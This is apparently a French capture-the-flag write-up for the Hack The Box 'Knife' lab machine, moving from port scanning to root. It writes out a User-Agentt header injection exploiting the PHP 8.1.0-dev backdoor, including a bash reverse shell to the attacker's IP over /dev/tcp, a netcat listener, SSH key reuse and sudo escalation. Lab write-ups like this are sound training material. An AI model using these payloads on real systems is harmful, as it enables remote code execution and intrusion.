# Knife [Linux] Easy

[https://app.hackthebox.com/machines/Knife/walkthroughs](https://app.hackthebox.com/machines/Knife/walkthroughs)

**— 1. Enumeration —**

`nmap -sS -sV -oN nmap.txt 10.10.10.242`

```perl
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 06:26 EDT
Nmap scan report for 10.10.10.242
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

`ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.242/FUZZ`

```perl
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.242/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 5815, Words: 646, Lines: 221]
index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 2324 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

On obtient aucun dossier intéressant nous allons envoyer une requête curl pour obtenir plus d’information 

![Untitled](Knife%20%5BLinux%5D%20Easy%20080a9de49913484fa838653bb003434a/Untitled.png)

On apprend que le site utilise PHP 8.1.

**— 2.Exploitation —**

J’ai donc chercher un exploit de PHP 8.1 je suis tombé sur ce github

[https://github.com/CalegariMindSec/Exploit-PHP-8.1.0](https://github.com/CalegariMindSec/Exploit-PHP-8.1.0)

`chmod +x script.sh`

`./script.sh http://10.10.10.242`

![Untitled](Knife%20%5BLinux%5D%20Easy%20080a9de49913484fa838653bb003434a/Untitled%201.png)

On peux prendre le premier flag user.txt

Le problème avec cette exploit est que le shell pue ça race on va donc le changer en y accédant à peux près de la même manière.

On fait une requête avec Burp et on l’envoie au Repeater. 

Pour s’assurer que la machine est exploitable on change notre request la ligne du User-Agent :

pour User-Agentt: zerodiumsystem(’/usr/bin/curl 10.10.14.5’);

Avec un server python créé on peux recevoir des get de la machine cible ce qui nous prouve que nous pouvons exécuter des commandes avec Burp.

Maitenant pour avoir notre shell nous allons changer la ligne User-Agent : en

User-Agentt: zerodiumsystem("bash -c 'bash -i >&/dev/tcp/10.10.14.5/4242 0>&1'");

En même temps nous avons un listener en écoute sur le port 4242

`nc -lvnp 4242`

![Untitled](Knife%20%5BLinux%5D%20Easy%20080a9de49913484fa838653bb003434a/Untitled%202.png)

**— 3. Privilege Escalation —**

Augmentons la qualité de notre shell 

[https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/](https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/)

Sinon nous pouvons nous connecter en ssh 

Allons dans /home/james/.ssh

`mv id_rsa.pub authorized_keys`

Sans ça notre clé n’est pas autorisé.

`cat id_rsa`

Et on copie colle le contenu dans un de nos fichier.

`ssh -i id_rsa james@10.10.10.242`

Maintenant Gagnons les permission sudo :

`sudo -l`

```perl
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

On peux utilisé la commande knife . Go GTFObins

![Untitled](Knife%20%5BLinux%5D%20Easy%20080a9de49913484fa838653bb003434a/Untitled%203.png)

On exécute la commande sudo de GTFO:

![Untitled](Knife%20%5BLinux%5D%20Easy%20080a9de49913484fa838653bb003434a/Untitled%204.png)